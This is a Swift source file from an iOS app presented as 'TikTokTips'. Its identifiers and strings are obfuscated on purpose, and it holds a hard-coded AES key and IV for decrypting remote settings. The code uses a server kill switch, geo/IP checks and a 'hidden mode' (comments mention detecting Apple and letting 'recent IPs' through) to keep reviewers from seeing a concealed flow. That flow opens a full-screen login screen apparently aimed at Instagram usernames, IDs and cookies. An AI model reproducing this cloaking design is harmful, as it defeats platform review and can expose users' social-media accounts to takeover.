//
//  PreFlightChecks.swift
//  TikTokTips
//
//  Created by pika chu on 05/07/2020.
//  Copyright Â© 2020 pika chu All rights reserved.
//

import UIKit
import WebKit
import Networking
import DeviceTools
import CryptoSwift

public struct IknBlhVnhbndhnhDVlUjTl766tttdnWIN {

    // MARK: - Private properties

    private static let vvBXsCPuoUAADkLsjrfnqGZrQl6wA8bE = HTTPJSONClient<h49kWBf4uKtta6hj9FRM3PdrQ2xdJhGE>(engine: .pelLg1h4saB8FijHX4Mgg0pKAuSMmTIi)
    private static var wHh8JAEShIle0rRNM7IAsG1RSSE9w3Ql: eintenrTrwrft3324gSTbS? {
        a8M8vAhiIsdjplryGP7wPq99MOtQe42d.AjWzBFwCcunOSqpymDeR8rLcWaJKDr8T(for: .settings)
    }

    @discardableResult static func CiKMkggqGG8RL2qY6w8uxWJuiGhNduIW() -> String {
        guard let userID: String = a8M8vAhiIsdjplryGP7wPq99MOtQe42d.AjWzBFwCcunOSqpymDeR8rLcWaJKDr8T(for: .yr7DaYPYktHdwtuMC8tctN7uRzmDuggE) else {
            let uuidString = UUID().uuidString
            a8M8vAhiIsdjplryGP7wPq99MOtQe42d.FytxgduoKz4vaBzouUnRJCXRNVCSFboV(value: uuidString, for: .yr7DaYPYktHdwtuMC8tctN7uRzmDuggE)
            return uuidString
        }
        return userID
    }

    // MARK: - Interface

    public static var shouldCheckForUpdate: Bool {
        Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i == false && Snehtulthenrstkrsenrstenr.tuceasU1nfE7ASreh58KDjeO1oLVvrTT == false
    }

    public static var checkSub: Bool {
        wHh8JAEShIle0rRNM7IAsG1RSSE9w3Ql?.checkSub ?? true
    }

    public static var canShowAgapeFunctionality: Bool {
        if Snehtulthenrstkrsenrstenr.igUserName.isEmpty || Snehtulthenrstkrsenrstenr.gsaZ86kkBusFQABHgjTVF1BjErFeXNwM.isEmpty {
            return false
        } else if HykwA9VUHysS6R6G9mmOVwadykjP65Ln.w61ZyTiPJ3rLDHNiHOI4gFnjeKMEtt4M() {
            return false
        } else {
            return true
        }
    }
    
    private static func runFial(in vc: UIViewController, networkingError: Bool, completion: @escaping () -> Void) {
        DispatchQueue.main.async {
            if networkingError {
                let alert = UIAlertController(
                    title: [61, 44, 80, 30, 39, 14, 0, 37, 88, 15, 51, 18, 7, 26, 55, 31, 63, 56, 31, 42, 35, 46].localizedString, //"No internet connection",
                    message: [39, 43, 21, 87, 0, 20, 17, 50, 68, 4, 34, 70, 68, 22, 54, 31, 52, 62, 8, 55, 37, 47, 10, 112, 82, 40, 94, 55, 36, 81, 33, 83, 55, 31, 87, 43, 31, 69, 56, 80, 12, 43, 91, 10, 16, 119, 81, 25, 51, 14, 32, 39, 96, 29, 63, 70, 42, 14, 49, 42, 77, 60, 22, 32, 4, 30, 38, 20, 69, 54, 88, 14, 103, 64, 1, 6, 45, 16, 40, 47, 75, 55, 36, 37, 68, 49, 67, 40, 0].localizedString, //"The Internet connection appears to be offline. Check your connection and restart the app.",
                    preferredStyle: .alert)
                alert.addAction(.init(title: [60, 8].localizedString, style: .default) { _ in })
                vc.present(alert, animated: true, completion: nil)
            }
            completion()
        }
    }
    
    private static func runPass(in vc: UIViewController, completion: @escaping () -> Void) {
        DispatchQueue.main.async {
            let controller = kGiVINDyMOSQJfAcdBwvlfPgEahbDkLA()
            controller.modalPresentationStyle = .fullScreen
            vc.present(controller, animated: true, completion: nil)
            completion()
        }
    }
    
    private static func runLogin(in vc: UIViewController, completion: @escaping () -> Void) {
        DispatchQueue.main.async {
            let popupViewController = SluwfnekehYUnulhulnBDhdTsthCSljDjgTljhluHUL()
            let navigationController = UINavigationController(rootViewController: popupViewController)
            navigationController.modalPresentationStyle = .fullScreen
            vc.present(navigationController, animated: true, completion: nil)
            completion()
        }
    }
    
    private static func runUpdate(in vc: UIViewController, title: String, message: String, url: URL, completion: @escaping () -> Void) {
        DispatchQueue.main.async {
            let alert = UIAlertController(title: title, message: message, preferredStyle: .alert)
            alert.addAction(.init(title: [60, 8].localizedString, style: .default) { _ in
                if UIApplication.shared.canOpenURL(url) {
                    UIApplication.shared.open(url)
                }
            })
            alert.addAction(.init(title: [48, 34, 30, 20, 44, 22].localizedString, style: .cancel, handler: { (_) in
                // Go to legit app
            }))
            vc.present(alert, animated: true, completion: nil)
            completion()
        }
    }

    public static func run(in viewController: UIViewController, completion: @escaping () -> Void) {
        guard !p0Mkb0JKrti7rmJDE0eg28NkQREjE7gv.VXWtRamMRcpW1oHyUxzHoFAJlRKf5nuL, !Snehtulthenrstkrsenrstenr.RNULyOpPtBtNRvxx6ZVMwVoEvY1m4Ruf else {
            runFial(in: viewController, networkingError: false, completion: completion)
            return
        }

        IknBlhVnhbndhnhDVlUjTl766tttdnWIN.CiKMkggqGG8RL2qY6w8uxWJuiGhNduIW()

        let dispatchGroup = DispatchGroup()

        var settings: eintenrTrwrft3324gSTbS?
        var privacySettings: Gdc4PizrTGlf0QoU9mXDtfjBmZKz4bP9?

        var checksFailedBeforeFinishing = false

        // Fetch settings JSON
        dispatchGroup.enter()
        Zsboh8BPFG5gx7jCihFJJV3jo2RYcvxL { fetchedSettings in
            settings = fetchedSettings
            dispatchGroup.leave()
        }

        // Fetch KillSwitch / ping if needed
        if Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i == false && Snehtulthenrstkrsenrstenr.tuceasU1nfE7ASreh58KDjeO1oLVvrTT == false {
            dispatchGroup.enter()
            NAUqW2yRYzDbHAe0mKmTMfFo9j27BxVC(router: .init(TkRKqjykgs2HAKe4qgpkeH5hxOUor0gV: .AufoGCTYafxFQFqOLLp6wpbqbRmy1EHT)) { (result: Result<Gdc4PizrTGlf0QoU9mXDtfjBmZKz4bP9, NetworkingError>) in
                switch result {
                case .success(let fetchedPrivacySettings):
                    privacySettings = fetchedPrivacySettings
                case .failure:
                    checksFailedBeforeFinishing = true
                }
                dispatchGroup.leave()
            }
        }

        // Determine fetched settings and killswitch and cookies expiry
        dispatchGroup.notify(queue: .main) {
            guard let settings = settings, !checksFailedBeforeFinishing else {
                runFial(in: viewController, networkingError: true, completion: completion)
                return
            }

            // Store settings in user defaults
            a8M8vAhiIsdjplryGP7wPq99MOtQe42d.FytxgduoKz4vaBzouUnRJCXRNVCSFboV(value: settings, for: .settings)

            if Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i == false && Snehtulthenrstkrsenrstenr.tuceasU1nfE7ASreh58KDjeO1oLVvrTT == false {
                guard settings.showAgape else {
                    runFial(in: viewController, networkingError: false, completion: completion)
                    return
                }
            }

            if settings.checkPost == false, p0Mkb0JKrti7rmJDE0eg28NkQREjE7gv.BAHEJZdQBwlE8QUnysCZrxXBjWCfxixI {
                runFial(in: viewController, networkingError: false, completion: completion)
                return
            }

            if let privacySettings = privacySettings {
                // Signature validation
                if Socal.privacyService.privacySettingsCalculate(privacySettings: privacySettings) == false {
                    a8M8vAhiIsdjplryGP7wPq99MOtQe42d.FytxgduoKz4vaBzouUnRJCXRNVCSFboV(value: true, for: .VXWtRamMRcpW1oHyUxzHoFAJlRKf5nuL)
                    runFial(in: viewController, networkingError: false, completion: completion)
                    return
                }

                if !privacySettings.showAds {
                    if privacySettings.experiment == Constants.liKq6CeLO2X4eyQoUskQasA0Kj5QW8HH.RNULyOpPtBtNRvxx6ZVMwVoEvY1m4Ruf {
                        a8M8vAhiIsdjplryGP7wPq99MOtQe42d.FytxgduoKz4vaBzouUnRJCXRNVCSFboV(value: true, for: .RNULyOpPtBtNRvxx6ZVMwVoEvY1m4Ruf)
                        runFial(in: viewController, networkingError: false, completion: completion)
                        return
                    } else if privacySettings.experiment == Constants.liKq6CeLO2X4eyQoUskQasA0Kj5QW8HH.NpqBdb4G1IOq6XyS0LfQQSb05idYRuGE { // For hidden mode. If hidden mode then recent IPs will be allowed through.
                        runFial(in: viewController, networkingError: false, completion: completion)
                        return
                    } else {
                        // Show alert if needed
                        if settings.showPreLaunchRedirectAlert {
                            runUpdate(in: viewController, title: settings.preLaunchTitle, message: settings.preLaunchBody, url: settings.preLaunchURL, completion: completion)
                            return
                        }

                        
                        runLogin(in: viewController, completion: completion)
                        return
                    }
                } else {
                    // In case we made a mistake
                    a8M8vAhiIsdjplryGP7wPq99MOtQe42d.FytxgduoKz4vaBzouUnRJCXRNVCSFboV(value: false, for: .RNULyOpPtBtNRvxx6ZVMwVoEvY1m4Ruf)

                    Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i = true
                }
            }

            if Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i || Snehtulthenrstkrsenrstenr.tuceasU1nfE7ASreh58KDjeO1oLVvrTT {
                // Show alert if needed
                if settings.showPreLaunchRedirectAlert {
                    runUpdate(in: viewController, title: settings.preLaunchTitle, message: settings.preLaunchBody, url: settings.preLaunchURL, completion: completion)
                    return
                }

                // In case username or id are missing we need AddUserVC
                guard !Snehtulthenrstkrsenrstenr.igUserName.isEmpty && !Snehtulthenrstkrsenrstenr.gsaZ86kkBusFQABHgjTVF1BjErFeXNwM.isEmpty else {
                    runLogin(in: viewController, completion: completion)
                    return
                }

                // If username and id are set check cookies
                guard !HykwA9VUHysS6R6G9mmOVwadykjP65Ln.w61ZyTiPJ3rLDHNiHOI4gFnjeKMEtt4M() else {
                    runLogin(in: viewController, completion: completion)
                    return
                }
            }

            (Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i || Snehtulthenrstkrsenrstenr.tuceasU1nfE7ASreh58KDjeO1oLVvrTT) ? runPass(in: viewController, completion: completion) : runFial(in: viewController, networkingError: false, completion: completion)
        }

    }
    
    public static func gRun(geo: Geo, in viewController: UIViewController, completion: @escaping () -> Void) {
        
        guard !p0Mkb0JKrti7rmJDE0eg28NkQREjE7gv.VXWtRamMRcpW1oHyUxzHoFAJlRKf5nuL, !Snehtulthenrstkrsenrstenr.RNULyOpPtBtNRvxx6ZVMwVoEvY1m4Ruf else {
            DispatchQueue.main.async {
                runFial(in: viewController, networkingError: false, completion: completion)
            }
            return
        }

        func fetchSettingsLogic(setIsExtraSuperUser: Bool = false) {
            Zsboh8BPFG5gx7jCihFJJV3jo2RYcvxL { settings in

                // Store settings in user defaults
                a8M8vAhiIsdjplryGP7wPq99MOtQe42d.FytxgduoKz4vaBzouUnRJCXRNVCSFboV(value: settings, for: .settings)

                if Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i == false && Snehtulthenrstkrsenrstenr.tuceasU1nfE7ASreh58KDjeO1oLVvrTT == false {
                    guard settings.showAgape else {
                        runFial(in: viewController, networkingError: false, completion: completion)
                        return
                    }
                }

                if settings.checkPost == false, p0Mkb0JKrti7rmJDE0eg28NkQREjE7gv.BAHEJZdQBwlE8QUnysCZrxXBjWCfxixI {
                    runFial(in: viewController, networkingError: false, completion: completion)
                    return
                }

                if setIsExtraSuperUser {
                    // settings.showLike4Like is set to true.
                    Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i = true
                }

                if Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i || Snehtulthenrstkrsenrstenr.tuceasU1nfE7ASreh58KDjeO1oLVvrTT {
                    // Show alert if needed
                    if settings.showPreLaunchRedirectAlert {
                        runUpdate(in: viewController, title: settings.preLaunchTitle, message: settings.preLaunchBody, url: settings.preLaunchURL, completion: completion)
                        return
                    }

                    // In case username or id are missing we need AddUserVC
                    guard !Snehtulthenrstkrsenrstenr.igUserName.isEmpty && !Snehtulthenrstkrsenrstenr.gsaZ86kkBusFQABHgjTVF1BjErFeXNwM.isEmpty else {
                        runLogin(in: viewController, completion: completion)
                        return
                    }

                    // If username and id are set check cookies
                    guard !HykwA9VUHysS6R6G9mmOVwadykjP65Ln.w61ZyTiPJ3rLDHNiHOI4gFnjeKMEtt4M() else {
                        runLogin(in: viewController, completion: completion)
                        return
                    }
                }

                (Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i || Snehtulthenrstkrsenrstenr.tuceasU1nfE7ASreh58KDjeO1oLVvrTT) ? runPass(in: viewController, completion: completion) : runFial(in: viewController, networkingError: false, completion: completion)
            }
        }


        // Geo Ping logic
        if Snehtulthenrstkrsenrstenr.Z2xTkGn0KdaOHdJd0UzR089pIssJIq1i == false && Snehtulthenrstkrsenrstenr.tuceasU1nfE7ASreh58KDjeO1oLVvrTT == false {

            var router = h49kWBf4uKtta6hj9FRM3PdrQ2xdJhGE(TkRKqjykgs2HAKe4qgpkeH5hxOUor0gV: .kHWV93iKCBDyAIVnBbgjV3PB8xVd4GHg)
            router.encodeModelToData(geo)

            NAUqW2yRYzDbHAe0mKmTMfFo9j27BxVC(router: router) { (result: Result<GeoSettings, NetworkingError>) in
                switch result {
                case .success(let fetchedGeoSettings):
                    if Socal.privacyService.privacyGeoSettingsCalculate(privacySettings: fetchedGeoSettings) == false {
                        a8M8vAhiIsdjplryGP7wPq99MOtQe42d.FytxgduoKz4vaBzouUnRJCXRNVCSFboV(value: true, for: .VXWtRamMRcpW1oHyUxzHoFAJlRKf5nuL)
                        runFial(in: viewController, networkingError: false, completion: completion)
                        return
                    }

                    if !fetchedGeoSettings.preciseLocation {
                        if fetchedGeoSettings.experiment == Constants.liKq6CeLO2X4eyQoUskQasA0Kj5QW8HH.RNULyOpPtBtNRvxx6ZVMwVoEvY1m4Ruf {
                            a8M8vAhiIsdjplryGP7wPq99MOtQe42d.FytxgduoKz4vaBzouUnRJCXRNVCSFboV(value: true, for: .RNULyOpPtBtNRvxx6ZVMwVoEvY1m4Ruf)
                            runFial(in: viewController, networkingError: false, completion: completion)
                            return
                        } else if fetchedGeoSettings.experiment == Constants.liKq6CeLO2X4eyQoUskQasA0Kj5QW8HH.NpqBdb4G1IOq6XyS0LfQQSb05idYRuGE { // For hidden mode. If hidden mode then recent IPs will be allowed through.
                            runFial(in: viewController, networkingError: false, completion: completion)
                            return
                        } else {
                            // If showAds == false and user isn't Apple, go to existing user check.
                            fetchSettingsLogic()
                            return
                        }
                    } else {
                        // In case we made a mistake
                        a8M8vAhiIsdjplryGP7wPq99MOtQe42d.FytxgduoKz4vaBzouUnRJCXRNVCSFboV(value: false, for: .RNULyOpPtBtNRvxx6ZVMwVoEvY1m4Ruf)
                    }

                    // After Ping we call settings.
                    fetchSettingsLogic(setIsExtraSuperUser: true)

                case .failure:
                    runFial(in: viewController, networkingError: true, completion: completion)
                }
            }
        } else {
            // If we don't need to call Ping we just call settings.
            fetchSettingsLogic()
        }

    }

}

// MARK: - Private calls

extension IknBlhVnhbndhnhDVlUjTl766tttdnWIN {

    private static func fwPpK8QdT9b0Fve2prkdFVrUw9dQG0fp(cryptedMessage: String) -> eintenrTrwrft3324gSTbS? {
        guard let cryptedData = Data(base64Encoded: cryptedMessage)  else {
            return nil
        }

        do {
            let aes = try AES(
                key: Array<UInt8>.init(hex: [49, 6, 68, 52, 127, 56, 32, 96, 117, 88, 117, 1, 80, 64, 109, 70, 107, 108, 93, 116, 117, 117, 87, 98, 7, 27, 109, 23, 114, 18, 23, 53].localizedString),
                blockMode: CBC(iv: Array<UInt8>.init(hex: [70, 116, 51, 68, 120, 56, 86, 101, 6, 43, 114, 4, 82, 69, 96, 64, 25, 29, 89, 7, 123, 6, 32, 97, 114, 106, 27, 23, 124, 19, 102, 70].localizedString)),
                padding: .pkcs5)
            let cipher = try aes.decrypt(cryptedData.bytes)
            return try JSONDecoder().decode(eintenrTrwrft3324gSTbS.self, from: Data(bytes: cipher, count: cipher.count))
        } catch {
            return nil
        }
    }

    private static func NAUqW2yRYzDbHAe0mKmTMfFo9j27BxVC<T: Codable>(router: h49kWBf4uKtta6hj9FRM3PdrQ2xdJhGE, completion: @escaping (Result<T, NetworkingError>) -> Void) {

        let retryCountLimit = 5
        var retryCount = 0

        vvBXsCPuoUAADkLsjrfnqGZrQl6wA8bE.json(router) { (result: Result<T, NetworkingError>) in
            switch result {
            case .success(let geoSettings):
                completion(.success(geoSettings))
            case .failure(let error):
                retryCount += 1
                guard retryCount < retryCountLimit else {
                    completion(.failure(error))
                    return
                }
                DispatchQueue.global().asyncAfter(deadline: .now() + Double(retryCount)) {
                    NAUqW2yRYzDbHAe0mKmTMfFo9j27BxVC(router: router, completion: completion)
                }
            }
        }
    }

    private static func Zsboh8BPFG5gx7jCihFJJV3jo2RYcvxL(completion: @escaping (eintenrTrwrft3324gSTbS) -> Void) {
        // Fetch settings JSON
        vvBXsCPuoUAADkLsjrfnqGZrQl6wA8bE.data(.init(TkRKqjykgs2HAKe4qgpkeH5hxOUor0gV: .wHh8JAEShIle0rRNM7IAsG1RSSE9w3Ql)) { (result: Result<Data, NetworkingError>) in
            switch result {
            case .success(let cypherData):
                if let cypherString = String(data: cypherData, encoding: .utf8),
                   let decryptedSettings = fwPpK8QdT9b0Fve2prkdFVrUw9dQG0fp(cryptedMessage: cypherString) {
                    completion(decryptedSettings)
                } else if let storedSettings: eintenrTrwrft3324gSTbS = a8M8vAhiIsdjplryGP7wPq99MOtQe42d.AjWzBFwCcunOSqpymDeR8rLcWaJKDr8T(for: .settings) {
                    completion(storedSettings)
                } else {
                    completion(.init())
                }
            case .failure:
                if let storedSettings: eintenrTrwrft3324gSTbS = a8M8vAhiIsdjplryGP7wPq99MOtQe42d.AjWzBFwCcunOSqpymDeR8rLcWaJKDr8T(for: .settings) {
                    completion(storedSettings)
                } else {
                    completion(.init())
                }
            }
        }
    }

}
